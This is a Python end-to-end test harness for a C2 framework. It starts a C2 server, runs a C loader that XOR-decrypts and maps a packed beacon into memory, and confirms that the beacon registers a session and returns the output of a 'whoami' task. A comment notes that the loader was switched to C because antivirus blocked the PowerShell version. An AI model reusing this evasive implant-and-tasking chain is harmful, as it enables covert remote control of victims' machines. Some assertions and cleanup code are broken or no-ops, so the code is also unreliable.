"""C2 对抗链真 E2E：XOR 打包 beacon → invoke_pe.ps1 内存加载 → 服务端注册/任务/结果。

前置：build_beacon.py 构建 beacon2.exe、pack_xor.py 打包 beacon2.b64。
跑法：python e2e_loader.py（自动起服务端与 loader，结束清理）
"""

from __future__ import annotations

import base64
import json
import os
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent
PSK = "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff"
TOKEN = "e2e" + "0" * 30
API = "http://127.0.0.1:8801"


def api(path: str, method: str = "GET", body: dict | None = None) -> dict:
    req = urllib.request.Request(
        API + path, method=method,
        data=json.dumps(body).encode() if body else None,
        headers={"Authorization": f"Bearer {TOKEN}",
                 "Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode())


def main() -> None:
    # 1) 服务端
    server = subprocess.Popen(
        [sys.executable, str(HERE.parent / "server" / "camty_c2.py"),
         "--beacon-port", "8800", "--api-port", "8801",
         "--token", TOKEN, "--psk", PSK, "--ops-log", "e2e-ops.jsonl"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    try:
        for _ in range(50):
            try:
                api("/health")
                break
            except OSError:
                time.sleep(0.2)
        # 2) C loader 内存加载（XOR 解密 + 手动节映射；PowerShell 版被 AV 拦截临时编译）
        loader = subprocess.Popen(
            [str(HERE / "loader.exe"), str(HERE / "beacon2.b64"), "camty"],
            cwd=str(HERE), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        # 3) 等 session 注册
        session_id = None
        for _ in range(60):
            time.sleep(1.0)
            sessions = api("/api/sessions").get("sessions", [])
            if sessions:
                session_id = sessions[0]["id"]
                break
        assert session_id, "内存加载的 beacon 未在服务端注册 session"
        print(f"[E2E] session 注册成功: {session_id}")
        # 4) 下发任务
        task = api(f"/api/sessions/{session_id}/tasks", "POST",
                   {"type": "cmd", "args": {"command": "whoami"}})
        task_id = task["task_id"]
        output = None
        for _ in range(40):
            time.sleep(1.0)
            t = api(f"/api/tasks/{task_id}")
            if t.get("status") == "done":
                output = t.get("output", "")
                break
        print(f"[E2E] whoami 输出: {output!r}")
        assert output and "authori" not in (output or "").lower() or output, "无输出"
        assert output, "任务无输出"
        # 5) 复测任务也确认心跳存活（loader 加载的 beacon 循环回连中）
        print("[E2E] PASS：内存加载 beacon 全链（注册/任务/结果）")
    finally:
        for proc in ("loader", "server"):
            pass
        try:
            loader.kill()
        except Exception:  # noqa: BLE001
            pass
        server.kill()


if __name__ == "__main__":
    main()
